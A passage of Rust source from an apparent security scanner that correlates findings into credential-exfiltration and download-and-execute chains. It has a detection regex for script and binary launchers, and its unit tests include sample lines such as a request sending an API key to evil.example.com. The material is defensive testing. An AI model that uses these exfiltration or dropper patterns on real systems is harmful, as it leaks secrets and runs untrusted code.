        .filter(|&n| n != skip && n <= code.lines.len())
        .any(|n| {
            let c = code.code(n);
            c.len() <= MAX_HOP_LINE
                && occurrences(c, name).any(|at| c[at + name.len()..].trim_start().starts_with('('))
                && (uses_value(c, bound, code.lang, None)
                    || derived_names(code, source_line, n, &[bound])
                        .iter()
                        .any(|d| uses_value(c, d, code.lang, None)))
        })
}

/// From where in the sink's window (which starts at the sink line) the
/// occurrences of `bound` are a function's parameter rather than the value
/// the source line bound: 0 when the sink is in the body of a function,
/// declared after the source line, whose parameter list declares `bound`
/// (`def ping(url):` above `requests.get(url + "/ping")`); the start of
/// such a header on the sink line itself (`lambda url: requests.get(url)`);
/// `None` when no such header shadows it. A function that is called with
/// the bound value (`send(token)` within the rule's window of the source)
/// passes it on, and does not shadow it.
fn shadowed_from(
    code: &CodeLines,
    source_line: usize,
    sink_line: usize,
    bound: &str,
    window: usize,
) -> Option<usize> {
    let mut from: Option<usize> = None;
    for h in source_line + 1..=sink_line {
        let line = code.code(h);
        if line.len() > MAX_HOP_LINE || !contains_word(line, bound) {
            continue;
        }
        for header in headers(line, code.lang) {
            if !declares(header.params, bound) {
                continue;
            }
            let at = if h == sink_line {
                header.start
            } else if in_body(code, h, &header, sink_line) {
                0
            } else {
                continue;
            };
            if header.name.is_some_and(|f| {
                called_with(
                    code,
                    f,
                    bound,
                    source_line,
                    source_line + 1..=source_line + window,
                    h,
                )
            }) {
                continue;
            }
            from = Some(from.map_or(at, |f| f.min(at)));
        }
    }
    from
}

fn launched_operand_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        // CODE-RUNFILE-001's alternatives (cli/packs/core/v1/code_patterns.json),
        // each with its program operand captured.
        Regex::new(concat!(
            r#"subprocess\.(?:run|call|Popen|check_call|check_output)\s*\(\s*\[\s*(?:sys\.executable|["'](?:python[0-9.]*|pythonw|py|bash|sh|zsh|node|pwsh|powershell(?:\.exe)?|cmd(?:\.exe)?|wscript|cscript|msiexec|rundll32|regsvr32|mshta|perl|ruby)["'])\s*,\s*(?:["'](?:-u|-B|-E|-I|-s|-S|-O|-File|-NoProfile|-NonInteractive|-ExecutionPolicy|Bypass|-WindowStyle|Hidden|-NoLogo|/i|/q|/qn)["']\s*,\s*)*(?P<list>[A-Za-z_][\w.]*|f["'][^"'\n]*\{[A-Za-z_][\w.]*\}[^"'\n]*["']|["'][^"'\s]*\.(?:py|pyz|pyc|sh|ps1|js|mjs|exe|bat|cmd|vbs|jar|msi)["'])\s*[,\]]"#,
            r#"|\bos\.startfile\s*\(\s*(?P<startfile>[^,)\n]+)"#,
            r#"|\bStart-Process\s+(?:-FilePath\s+)?(?P<ps>["']?(?:\$\{?|\{)[A-Za-z_]\w*)"#,
            r#"|\bexecFile(?:Sync)?\s*\(\s*(?P<exec>[A-Za-z_][\w.]*)\s*[,)]"#,
            r#"|(?:^\s*|[;&|(]\s*|\bthen\s+|\bdo\s+)(?:sudo\s+)?(?:bash|sh|zsh|python[0-9.]*|node|pwsh|powershell)\s+(?P<shell>["']?\$\{?[A-Za-z_]\w*\}?["']?)\s*(?:$|[;&|)])"#,
        ))
        .expect("launched-operand regex compiles")
    })
}

/// The program operands a launch line runs, as CODE-RUNFILE-001 matches
/// them: `PATH` in `subprocess.run([sys.executable, PATH, data_path])`,
/// `"{output_file}"` after `Start-Process`, `"$INSTALLER"` after `bash`, the
/// first argument of `os.startfile` or `execFile`. A written file linked to a
/// launch must be one of these, not another argument (`data_path`, `cwd=`,
/// `env=`) or a comment on the line.
pub(crate) fn launched_operands(line: &str) -> Vec<&str> {
    launched_operand_re()
        .captures_iter(line)
        .filter_map(|c| {
            ["list", "startfile", "ps", "exec", "shell"]
                .iter()
                .find_map(|g| c.name(g))
                .map(|m| m.as_str())
        })
        .collect()
}

/// The sink's statement (1-based lines `start..=end`), the text a link is
/// read from, and the bracket groups each statement line starts in (see
/// [`group_paths`]; empty outside the statement mode).
struct SinkScope {
    start: usize,
    end: usize,
    text: String,
    groups: Vec<Vec<u32>>,
}

impl SinkScope {
    /// A scope that is the sink line alone, read as `text`.
    fn line(sink_line: usize, text: String) -> Self {
        SinkScope {
            start: sink_line,
            end: sink_line,
            text,
            groups: Vec::new(),
        }
    }

    /// Is `source_line`, another line of the statement, part of the same
    /// call or literal as the sink line: in the group the sink line starts
    /// in, in one nested inside it, or in one the sink's group is nested
    /// inside? Two sibling literals of one statement (`openai: {...}` and
    /// `db: { ssl: {...} }` in one exported config) are not.
    fn same_call(&self, source_line: usize, sink_line: usize) -> bool {
        if source_line == sink_line || !(self.start..=self.end).contains(&source_line) {
            return false;
        }
        let path = |n: usize| self.groups.get(n - self.start).map(Vec::as_slice);
        match (path(source_line), path(sink_line)) {
            (Some(a), Some(b)) => a.starts_with(b) || b.starts_with(a),
            _ => false,
        }
    }
}

/// For each line of `start..=end` (1-based), the bracket groups its first
/// token sits in, outermost first: `[0, 2]` is inside group 2, which is
/// inside group 0. Closing brackets at the start of a line close their
/// groups before its first token (`}, verify=False)` is back in the call).
/// Brackets inside a quoted string on the line, or after a trailing comment,
/// are not counted, and a quote does not carry over to the next line.
///
/// A line that is one key and a literal it opens and closes (`"metrics":
/// {"url": u, "verify_ssl": False},`, `headers={"Authorization": t},`) gets
/// a group of its own on top: whatever that line matched is inside the
/// literal, so two such lines are siblings, while the literal is still
/// inside the call the lines around it belong to.
fn group_paths(lines: &[&str], start: usize, end: usize) -> Vec<Vec<u32>> {
    let mut stack: Vec<u32> = Vec::new();
    let mut next = 0u32;
    let mut out = Vec::new();
    for n in start..=end {
        let code = lines
            .get(n.wrapping_sub(1))
            .map_or("", |l| strip_trailing_comment(l))
            .as_bytes();
        let mut i = 0;
        while i < code.len() && (code[i].is_ascii_whitespace() || b")]}".contains(&code[i])) {
            if !code[i].is_ascii_whitespace() {
                stack.pop();
            }
            i += 1;
        }
        let mut path = stack.clone();
        if is_keyed_literal(&code[i..]) {
            path.push(next);
            next += 1;
        }
        out.push(path);
        for (_, b) in brackets(&code[i..]) {
            if b"([{".contains(&b) {
                stack.push(next);
                next += 1;
            } else {
                stack.pop();
            }
        }
    }
    out
}

/// The brackets of `code` outside quoted strings, with their offsets. A
/// quote left open runs to the end of `code`.
fn brackets(code: &[u8]) -> Vec<(usize, u8)> {
    let mut out = Vec::new();
    let mut quote: Option<u8> = None;
    let mut i = 0;
    while i < code.len() {
        let b = code[i];
        match quote {
            Some(_) if b == b'\\' => i += 1,
            Some(q) if b == q => quote = None,
            Some(_) => {}
            None if b"\"'`".contains(&b) => quote = Some(b),
            None if b"([{)]}".contains(&b) => out.push((i, b)),
            None => {}
        }
        i += 1;
    }
    out
}

/// Is `code` (a line from its first token) one key and a literal it opens
/// and closes: `name: {...},`, `"name": [...]`, `name={...},`?
fn is_keyed_literal(code: &[u8]) -> bool {
    let mut i = 0;
    match code.first() {
        Some(&q) if q == b'"' || q == b'\'' => {
            let Some(close) = code[1..].iter().position(|&b| b == q) else {
                return false;
            };
            i = close + 2;
        }
        Some(b) if b.is_ascii_alphabetic() || *b == b'_' || *b == b'$' => {
            while i < code.len() && (is_ident_byte(code[i]) || code[i] == b'$') {
                i += 1;
            }
        }
        _ => return false,
    }
    let blank = |b: &u8| *b == b' ' || *b == b'\t';
    while code.get(i).is_some_and(blank) {
        i += 1;
    }
    match (code.get(i), code.get(i + 1)) {
        (Some(b':'), Some(b':')) | (Some(b'='), Some(b'=' | b'>')) => return false,
        (Some(b':' | b'='), _) => i += 1,
        _ => return false,
    }
    while code.get(i).is_some_and(blank) {
        i += 1;
    }
    if !code.get(i).is_some_and(|b| b"([{".contains(b)) {
        return false;
    }
    // The bracket that opens the literal closes last, and nothing but a
    // separator follows it.
    let mut depth = 0usize;
    let mut closed_at = None;
    for (at, b) in brackets(&code[i..]) {
        if b"([{".contains(&b) {
            depth += 1;
        } else {
            depth = depth.saturating_sub(1);
            if depth == 0 {
                closed_at = Some(i + at);
                break;
            }
        }
    }
    closed_at.is_some_and(|c| {
        code[c + 1..]
            .iter()
            .all(|b| b.is_ascii_whitespace() || *b == b',' || *b == b';')
    })
}

/// The window of a rule with `sink_window_before`: the statement the sink
/// line belongs to, and the nearby lines that set up or use the object that
/// statement works with.
///
/// - **The statement**: the lines above that continue into the sink line
///   (at most `before`, see [`continuation_start`]), the sink line, and the
///   lines below it that its call continues onto (within
///   [`SINK_ARG_WINDOW`]).
/// - **Set-up above** (within `before` lines of the sink): a line that
///   assigns to or calls a method on a local name the statement uses —
///   `headers = {"Authorization": ...}` above `get(url, headers=headers,
///   verify=False)`, `session.headers.update(...)` above
///   `session.get(url, verify=False)`. "Local" means assigned on one of
///   those lines, or an attribute of `self` / `this`, so an imported module
///   (`requests.post(...)` above `requests.get(..., verify=False)`) does not
///   connect two unrelated calls.
/// - **Use below** (within [`SINK_ARG_WINDOW`] lines of the sink): a line
///   that uses the name the statement assigns — `fetch(url, { agent, ... })`
///   after `const agent = new https.Agent({ rejectUnauthorized: false })`.
///
/// Any other line near the sink is a different statement about something
/// else, and is not read: a key used by `client = OpenAI(api_key=key)` on the
/// line above an unrelated insecure request is not sent by that request.
fn statement_scope(lines: &[&str], sink_line: usize, before: usize) -> SinkScope {
    if sink_line == 0 || sink_line > lines.len() {
        return SinkScope::line(sink_line, String::new());
    }
    let line = |n: usize| lines[n - 1];
    let start = continuation_start(lines, sink_line, before);
    let last = lines.len().min(sink_line + SINK_ARG_WINDOW - 1);
    let mut end = sink_line;
    while end < last && continues_into_next(line(end)) {
        end += 1;
    }
    let statement = (start..=end).map(line).collect::<Vec<_>>().join("\n");

    let top = sink_line.saturating_sub(before).max(1);
    let locals: Vec<&str> = (top..=end)
        .filter_map(|n| assigned_name(line(n)).map(|(name, _)| name))
        .collect();
    let mut keep: Vec<usize> = (top..start)
        .filter(|&n| {
            leading_name(line(n)).is_some_and(|(name, attr)| {
                (attr || locals.contains(&name)) && uses_word(&statement, name)
            })
        })
        .collect();
    keep.extend(start..=end);
    if let Some((bound, _)) = assigned_name(line(start)) {
        keep.extend((end + 1..=last).filter(|&n| uses_word(line(n), bound)));
    }
    SinkScope {
        start,
        end,
        text: keep.into_iter().map(line).collect::<Vec<_>>().join("\n"),
        groups: group_paths(lines, start, end),
    }
}

/// Declaration keywords before the name a line starts with, and an optional
/// `self.` / `this.` / `@` / `$`.
const NAME_HEAD: &str = r"^\s*(?:(?:const|let|mut|var|export|local|my|our|final|val|auto|readonly)\s+)*[$@]?((?:self|this)\.)?([A-Za-z_][A-Za-z0-9_]*)";

fn leading_name_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(NAME_HEAD).expect("leading-name regex compiles"))
}

fn assigned_name_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        // The name, then attribute or subscript steps (`session.verify`,
        // `session.headers["Authorization"]`), an optional type annotation,
        // and an assignment operator that is not a comparison.
        Regex::new(&format!(
            r"{NAME_HEAD}(?:\s*\.\s*[A-Za-z_][A-Za-z0-9_]*|\[[^\]\n]*\])*\s*(?::\s*[A-Za-z0-9_\[\]<>|,. ]+)?\s*(?::=|\+=|=)(?:[^=]|$)"
        ))
        .expect("assigned-name regex compiles")
    })
}

/// The first name on a line (after declaration keywords), and whether it is
/// an attribute of `self` / `this`.
fn leading_name(line: &str) -> Option<(&str, bool)> {
    let c = leading_name_re().captures(line)?;
    Some((c.get(2)?.as_str(), c.get(1).is_some()))
}

/// The object a line assigns to: `agent` in `const agent = ...`, `session`
/// in `session.verify = False` and `self.session.headers["A"] = ...`.
fn assigned_name(line: &str) -> Option<(&str, bool)> {
    let c = assigned_name_re().captures(line)?;
    Some((c.get(2)?.as_str(), c.get(1).is_some()))
}

/// The first line (1-based) of the run of lines directly above `sink_line`
/// that continue into it, at most `before` lines up; `sink_line` itself when
/// the line above does not continue, or `before` is 0.
///
/// A line continues into the next when it ends inside an open argument
/// list or literal: with `(`, `[`, `,`, a backslash, or a `{` that opens an
/// object or struct literal rather than a block (see [`continues_into_next`]).
/// So the run is the opening line and the earlier arguments of the
/// multi-line call whose last argument is the sink, and it stops at the
/// first complete statement above it.
fn continuation_start(lines: &[&str], sink_line: usize, before: usize) -> usize {
    let mut start = sink_line;
    while start > 1 && sink_line - (start - 1) <= before {
        match lines.get(start - 2) {
            Some(above) if continues_into_next(above) => start -= 1,
            _ => break,
        }
    }
    start
}

/// Does this line end inside an argument list or literal that the next line
/// continues? Trailing `#` and `//` comments are ignored.
fn continues_into_next(line: &str) -> bool {
    let code = strip_trailing_comment(line).trim_end();
    let Some(last) = code.chars().last() else {
        return false;
    };
    match last {
        '(' | '[' | ',' | '\\' => true,
        '{' => {
            let head = &code[..code.len() - 1];
            let before = head.trim_end();
            let spaced = before.len() < head.len();
            match before.chars().last() {
                // A `{` alone on its line (an Allman-style initializer or
                // block) carries nothing a name could be read from.
                None => true,
                // An object literal: `= {`, `({`, `[{`, `, {`, `key: {`,
                // `? {`, `{ {`.
                Some('=' | '(' | '[' | ',' | ':' | '?' | '{' | '|' | '&') => true,
                // A block: `f(token) {`, `() => {`.
                Some(')' | '>') => false,
                // `return {` returns an object literal.
                Some(_) if before.ends_with("return") => true,
                // `tls.Config{` / `Transport{` (a struct literal glued to its
                // type) against `class A {`, `else {`, `func f() *T {`.
                Some(_) => !spaced,
            }
        }
        _ => false,
    }
}

/// The line up to a trailing comment: a `#` or `//` that follows whitespace
/// (so `://` in a URL and `this.#field` are kept).
fn strip_trailing_comment(line: &str) -> &str {
    let bytes = line.as_bytes();
    for (i, w) in bytes.windows(2).enumerate() {
        if w[0].is_ascii_whitespace() && (w[1] == b'#' || line[i + 1..].starts_with("//")) {
            return &line[..i];
        }
    }
    line
}

/// Is 1-based line `n` longer than `limit` bytes (`limit` 0: never)?
fn too_long(lines: &[&str], n: usize, limit: usize) -> bool {
    limit > 0
        && lines
            .get(n.wrapping_sub(1))
            .is_some_and(|l| l.len() > limit)
}

fn truncate(s: &str) -> String {
    const LIMIT: usize = 120;
    if s.len() <= LIMIT {
        return s.to_string();
    }
    let end = s
        .char_indices()
        .take_while(|(i, _)| *i < LIMIT)
        .last()
        .map(|(i, ch)| i + ch.len_utf8())
        .unwrap_or(0);
    format!("{} ...", &s[..end])
}

fn parse_severity(s: &str) -> Severity {
    match s.to_lowercase().as_str() {
        "critical" => Severity::Critical,
        "high" => Severity::High,
        "medium" => Severity::Medium,
        _ => Severity::Low,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::corpus::schema::FindingSelector;

    fn rule() -> CorrelationRule {
        CorrelationRule {
            id: "EXFIL-CHAIN-001".to_string(),
            phase: "network_exfil".to_string(),
            severity: "critical".to_string(),
            description: "Credential read reaches a network send".to_string(),
            weight: Some(10),
            source: FindingSelector {
                rule_prefixes: vec!["CRED-".to_string()],
                rule_ids: vec![],
            },
            sink: FindingSelector {
                rule_prefixes: vec![],
                rule_ids: vec!["NET-001".to_string(), "NET-004".to_string()],
            },
            window_lines: 20,
            sink_window_before: 0,
            // Unset: the default, which outside the statement mode is the
            // word reading the legacy chains used before `name_uses` existed.
            name_uses: None,
            max_line_length: 0,
            sink_excludes: vec!["headers".to_string(), "Authorization".to_string()],
            remediation: None,
            references: vec![],
            tags: vec![],
        }
    }

    fn f(rule: &str, line: usize) -> Finding {
        Finding {
            phase: Phase::Credentials,
            rule: rule.to_string(),
            severity: Severity::Low,
            file: "a.py".to_string(),
            line: Some(line),
            snippet: String::new(),
            weight: 1,
            kev: false,
            epss: 0.0,
            fingerprint: String::new(),
            locator: None,
            evidence: Default::default(),
        }
    }

    #[test]
    fn assignment_identifiers() {
        // sigil:ignore-next-line CRED-001 -- test input string, not a read
        assert_eq!(
            assigned_identifier("api_key = os.getenv(\"OPENAI_API_KEY\")"),
            Some("api_key")
        );
        assert_eq!(
            assigned_identifier("const token = process.env.TOKEN;"),
            Some("token")
        );
        assert_eq!(
            assigned_identifier("let key: string = process.env.KEY!"),
            Some("key")
        );
        assert_eq!(
            assigned_identifier("self.secret = os.environ['SECRET']"),
            Some("secret")
        );
        assert_eq!(assigned_identifier("if a == b:"), None);
        assert_eq!(assigned_identifier("requests.post(url, json=data)"), None);
    }

    /// prism's fixture, lines 9-10: the key read on one line is the payload of
    /// the post on the next.
    #[test]
    fn links_assignment_to_payload() {
        let src = "import os\napi_key = os.getenv(\"OPENAI_API_KEY\")\nrequests.post(\"https://evil.example.com/c\", json={\"key\": api_key})\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 2), f("NET-001", 3)];
        let chains = apply(&[rule()], &findings, &lines);
        assert_eq!(chains.len(), 1, "{chains:#?}");
        assert_eq!(chains[0].rule, "EXFIL-CHAIN-001");
        assert_eq!(chains[0].line, Some(3));
        assert_eq!(chains[0].severity, Severity::Critical);
        assert_eq!(chains[0].weight, 10);
        assert!(chains[0]
            .snippet
            .contains("CRED-012 (@L2) reaches NET-001 (@L3)"));
    }

    /// The ordinary API client: key read, then used in an auth header. No chain.
    #[test]
    fn auth_header_use_is_not_exfiltration() {
        let src = "token = os.environ[\"API_TOKEN\"]\nresp = requests.get(url, headers={\"Authorization\": f\"Bearer {token}\"})\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 2)];
        assert!(apply(&[rule()], &findings, &lines).is_empty());
    }

    /// Proximity alone is not a link: an unrelated request near a key read.
    #[test]
    fn unrelated_nearby_request_is_not_a_chain() {
        let src =
            "key = os.environ[\"SECRET_KEY\"]\nrequests.get(\"https://example.com/status\")\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 2)];
        assert!(apply(&[rule()], &findings, &lines).is_empty());
    }

    #[test]
    fn multiline_call_arguments_are_in_the_window() {
        let src = "secret = os.getenv(\"AWS_SECRET_ACCESS_KEY\")\nrequests.post(\n    url,\n    data={\"s\": secret},\n)\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 2)];
        assert_eq!(apply(&[rule()], &findings, &lines).len(), 1);
    }

    #[test]
    fn same_line_source_and_sink_link() {
        let src = "requests.post(url, json={\"k\": os.getenv(\"API_KEY\")})\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 1)];
        assert_eq!(apply(&[rule()], &findings, &lines).len(), 1);
    }

    #[test]
    fn window_and_order_are_enforced() {
        let mut src = String::from("key = os.getenv(\"API_KEY\")\n");
        for _ in 0..25 {
            src.push_str("pass\n");
        }
        src.push_str("requests.post(url, json={\"k\": key})\n");
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 27)];
        assert!(
            apply(&[rule()], &findings, &lines).is_empty(),
            "outside window"
        );

        let src2 = "requests.post(url, json={\"k\": key})\nkey = os.getenv(\"API_KEY\")\n";
        let lines2: Vec<&str> = src2.lines().collect();
        let findings2 = vec![f("NET-001", 1), f("CRED-012", 2)];
        assert!(
            apply(&[rule()], &findings2, &lines2).is_empty(),
            "sink before source"
        );
    }

    /// The write-target binder: each form names the file the line writes.
    /// (The end-to-end download→run and archive→upload chains are tested in
    /// `corpus::engine::reconcile`, which is excluded from the self-scan; the
    /// strings here are chosen so no content rule fires on this file.)
    #[test]
    fn written_targets_name_the_file_a_line_writes() {
        // The written path and the handle that yields data are bound; the
        // handle of the file opened for writing receives data and is not.
        assert_eq!(
            written_targets("    with src as response, open(PATH, 'wb') as out_file:"),
            vec!["PATH", "response"]
        );
        assert_eq!(
            written_paths("    with src as response, open(PATH, 'wb') as out_file:"),
            vec!["PATH"]
        );
        assert_eq!(
            written_targets("fh = open(self.dest, mode=\"ab\")"),
            vec!["dest"]
        );
        assert_eq!(
            written_targets("urlretrieve(url, filename=target_path)"),
            vec!["target_path"]
        );
        assert_eq!(
            written_targets(r#"cmd = f'fetch.exe -L {url} -o "{output_file}"'"#),
            vec!["output_file"]
        );
        assert_eq!(
            written_targets(r#"    tar -czf "$TARBALL" -C "$PROJECT_PATH" ."#),
            vec!["TARBALL"]
        );
        assert_eq!(
            written_targets("fetch-tool -OutFile $installer"),
            vec!["installer"]
        );
        // A read binds its handle (the data it yields), never its path; a
        // bare word after `-o` is not a path anyone can be sure of.
        assert_eq!(
            written_targets("with open(path) as handle:"),
            vec!["handle"]
        );
        assert!(written_paths("with open(path) as handle:").is_empty());
        assert!(written_targets("with open(os.path.expanduser(p), 'w') as out:").is_empty());
        assert!(!written_targets("data = open(path, 'rb').read()").contains(&"path"));
        assert!(written_targets("fetch-tool -o out").is_empty());
        // A literal path with a directory, or an executable file name, is
        // bound as written: `-o /tmp/x`, `urlretrieve(url, "/tmp/x.pyz")`.
        assert_eq!(
            written_targets("fetch-tool -o /tmp/out.bin"),
            vec!["/tmp/out.bin"]
        );
        assert_eq!(
            written_targets(r#"retrieve_it = open("/tmp/stage.pyz", "wb")"#),
            vec!["/tmp/stage.pyz"]
        );
        // The assignment is bound too, by `source_bindings`.
        assert_eq!(
            source_bindings(r#"retrieve_it = open("/tmp/stage.pyz", "wb")"#),
            vec!["retrieve_it", "/tmp/stage.pyz"]
        );
        assert!(written_targets(r#"text = open("/etc/hosts").read()"#).is_empty());
        // Output discarded to a device writes no file a later line can use.
        assert!(written_paths("fetch-tool -fsS -o /dev/null \"$CHECK_URL\"").is_empty());
        // One-letter handles collide with string prefixes (f"...", r"...").
        assert!(written_targets("with open(dest, 'w') as f:") == vec!["dest"]);
    }

    /// A path written on one line and used on the next links through the
    /// write binding, not only through an assignment.
    #[test]
    fn write_binding_links_like_an_assignment() {
        let src = "with src as response, open(PATH, 'wb') as out_file:\n    out_file.write(response.read())\nrun([\"tool\", PATH])\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 3)];
        assert_eq!(apply(&[rule()], &findings, &lines).len(), 1);
        // The same shape with a different path does not link.
        let src2 = "with src as response, open(PATH, 'wb') as out_file:\n    out_file.write(response.read())\nrun([\"tool\", OTHER])\n";
        let lines2: Vec<&str> = src2.lines().collect();
        assert!(apply(&[rule()], &findings, &lines2).is_empty());
    }

    /// A file opened for writing receives data. A login helper that opens a
    /// credential file for writing and then calls the auth endpoint writes the
    /// response into the handle — the opposite direction to exfiltration, and
    /// not a chain (it was one while write handles were bound).
    #[test]
    fn a_write_handle_is_not_a_source_of_data() {
        let src = "    with open(os.path.expanduser(NETRC), 'w') as netrc_file:\n        resp = post(LOGIN_URL, json=creds)\n        netrc_file.write(resp.json()['token'])\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-031", 1), f("NET-001", 2)];
        assert!(apply(&[rule()], &findings, &lines).is_empty());
        // The same line opened for reading yields the file's contents, and
        // sending them is the chain.
        let read = "    with open(os.path.expanduser(KEYFILE)) as key_file:\n        post(COLLECT_URL, data=key_file.read())\n";
        let lines_r: Vec<&str> = read.lines().collect();
        assert_eq!(apply(&[rule()], &findings, &lines_r).len(), 1);
    }

    fn launch_rule() -> CorrelationRule {
        CorrelationRule {
            id: "DROPPER-CHAIN-001".to_string(),
            severity: "high".to_string(),
            description: "Downloaded file is executed".to_string(),
            weight: Some(5),
            source: FindingSelector {
                rule_prefixes: vec![],
                rule_ids: vec!["NET-001".to_string(), "NET-002".to_string()],
            },
            sink: FindingSelector {
                rule_prefixes: vec![],
                rule_ids: vec!["CODE-RUNFILE-001".to_string()],
            },
            sink_excludes: vec![],
            ..rule()
        }
    }

    /// A sink that runs a file links only through a file the source wrote:
    /// downloaded *data* handed to a local script is that script's input, not
    /// the program that runs.
    #[test]
    fn a_launch_links_only_through_a_written_file() {
        let data = "data = get(JOBS_URL).json()\nfor job in data:\n    print(job)\nproc = run([interp, helper_script],\n           input=dumps(data))\n";
        let lines: Vec<&str> = data.lines().collect();
        let findings = vec![f("NET-001", 1), f("CODE-RUNFILE-001", 4)];
        assert!(apply(&[launch_rule()], &findings, &lines).is_empty());
        // The download writes PATH and the launch runs PATH: the chain.
        let dropper = "with urlopen(req) as response, open(PATH, 'wb') as out_file:\n    out_file.write(response.read())\nrun([interp, PATH])\n";
        let lines_d: Vec<&str> = dropper.lines().collect();
        let findings_d = vec![f("NET-002", 1), f("CODE-RUNFILE-001", 3)];
        assert_eq!(apply(&[launch_rule()], &findings_d, &lines_d).len(), 1);
        // The response handle reaching the launch's arguments is not a link.
        let handle = "with urlopen(req) as response:\n    pass\nrun([interp, helper_script], input=response.read())\n";
        let lines_h: Vec<&str> = handle.lines().collect();
        assert!(apply(&[launch_rule()], &findings_d, &lines_h).is_empty());
    }

    /// A rule whose sink is a keyword argument on its own line at the end of
    /// a multi-line call, like the insecure-transport chain.
    fn above_rule() -> CorrelationRule {
        CorrelationRule {
            id: "ABOVE-CHAIN".to_string(),
            severity: "high".to_string(),
            sink: FindingSelector {
                rule_prefixes: vec![],
                rule_ids: vec!["KWARG-001".to_string()],
            },
            sink_window_before: 5,
            sink_excludes: vec![],
            ..rule()
        }
    }

    #[test]
    fn a_window_above_the_sink_reaches_the_call_arguments() {
        // The token is bound on line 1 and used on line 4; the sink is the
        // keyword argument on line 6. Only a window above the sink sees it:
        // lines 2-5 continue into line 6 (the call's opening line and its
        // earlier arguments), line 1 is a complete statement.
        let src = "token = read_secret()\nresp = client.post(\n    url,\n    headers=auth(token),\n    timeout=5,\n    flag=off,\n)\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("KWARG-001", 6)];
        let chains = apply(&[above_rule()], &findings, &lines);
        assert_eq!(chains.len(), 1, "{chains:#?}");
        assert_eq!(chains[0].line, Some(6));
        // With the default window (nothing above the sink) there is no link.
        let below_only = CorrelationRule {
            sink_window_before: 0,
            ..above_rule()
        };
        assert!(apply(&[below_only], &findings, &lines).is_empty());
    }

    #[test]
    fn a_statement_above_the_sink_is_not_one_of_its_arguments() {
        // The source line sits a few lines above the sink and repeats its own
        // binding; nothing else uses the name.
        let src = "token = read_secret()\nlog(\"start\")\nping(status_url, flag=off)\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("KWARG-001", 3)];
        assert!(apply(&[above_rule()], &findings, &lines).is_empty());
        // The key is used on the line above, but by a different, complete
        // call: the insecure call below never sees it. (This linked, at
        // High, while the window above was a fixed five lines.)
        let other_call =
            "api_key = read_secret()\nclient = Vendor(api_key=api_key)\nstatus = ping(status_url, flag=off)\n";
        let lines_o: Vec<&str> = other_call.lines().collect();
        assert!(apply(&[above_rule()], &findings, &lines_o).is_empty());
        // The same for a JavaScript statement ending in `;`.
        let js = "const token = readSecret();\nconst gh = new Octokit({ auth: token });\nconst agent = makeAgent({ flag: off });\n";
        let lines_j: Vec<&str> = js.lines().collect();
        assert!(apply(&[above_rule()], &findings, &lines_j).is_empty());
    }

    #[test]
    fn a_source_inside_the_call_links_without_a_name() {
        // The credential is read inline, in the headers argument of the call
        // whose last argument is the sink: no name to carry, same call.
        let src = "resp = client.post(\n    url,\n    headers={\"Authorization\": read_secret()},\n    flag=off,\n)\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 3), f("KWARG-001", 4)];
        let chains = apply(&[above_rule()], &findings, &lines);
        assert_eq!(chains.len(), 1, "{chains:#?}");
        assert!(chains[0]
            .snippet
            .contains("CRED-012 (@L3) reaches KWARG-001 (@L4)"));
        // A source line above the call is not inside it.
        let above = "headers = {\"Authorization\": read_secret()}\nresp = client.post(\n    url,\n    flag=off,\n)\n";
        let lines_a: Vec<&str> = above.lines().collect();
        let findings_a = vec![f("CRED-012", 1), f("KWARG-001", 4)];
        assert!(apply(&[above_rule()], &findings_a, &lines_a).is_empty());
        // Without a window above, the call's other arguments are not read.
        let below_only = CorrelationRule {
            sink_window_before: 0,
            ..above_rule()
        };
        assert!(apply(&[below_only], &findings, &lines).is_empty());
    }

    #[test]
    fn set_up_above_and_use_below_join_the_statement() {
        let findings = vec![f("CRED-012", 1), f("KWARG-001", 3)];
        // A headers dict built from the key, then passed to the call.
        let dict = "token = read_secret()\nheaders = {\"Authorization\": token}\nresp = get(url, headers=headers, flag=off)\n";
        let lines: Vec<&str> = dict.lines().collect();
        assert_eq!(apply(&[above_rule()], &findings, &lines).len(), 1);
        // A session configured with the key, then used for the call.
        let session = "token = read_secret()\nsession.headers.update({\"Authorization\": token})\nr = session.get(url, flag=off)\n";
        let lines: Vec<&str> = session.lines().collect();
        // `session` is not assigned in the window: an unknown name, maybe a
        // module, and not read.
        assert!(apply(&[above_rule()], &findings, &lines).is_empty());
        let session = "token = read_secret()\nsession = Session()\nsession.headers.update({\"Authorization\": token})\nr = session.get(url, flag=off)\n";
        let lines: Vec<&str> = session.lines().collect();
        let findings_s = vec![f("CRED-012", 1), f("KWARG-001", 4)];
        assert_eq!(apply(&[above_rule()], &findings_s, &lines).len(), 1);
        // An attribute of `self` is the object's own state.
        let attr = "self.token = read_secret()\nself.session.headers[\"A\"] = self.token\nself.session.flag = off\n";
        let lines: Vec<&str> = attr.lines().collect();
        assert_eq!(apply(&[above_rule()], &findings, &lines).len(), 1);
        // A module used for another call above is not the insecure call's
        // set-up.
        let module = "token = read_secret()\nhttp.post(api, headers={\"A\": token})\nhttp.get(status_url, flag=off)\n";
        let lines: Vec<&str> = module.lines().collect();
        assert!(apply(&[above_rule()], &findings, &lines).is_empty());
        // Below: the agent the statement builds is used with the key.
        let agent = "const token = readSecret();\nconst agent = makeAgent({ flag: off });\nfetch(url, { agent, headers: { A: token } });\n";
        let lines: Vec<&str> = agent.lines().collect();
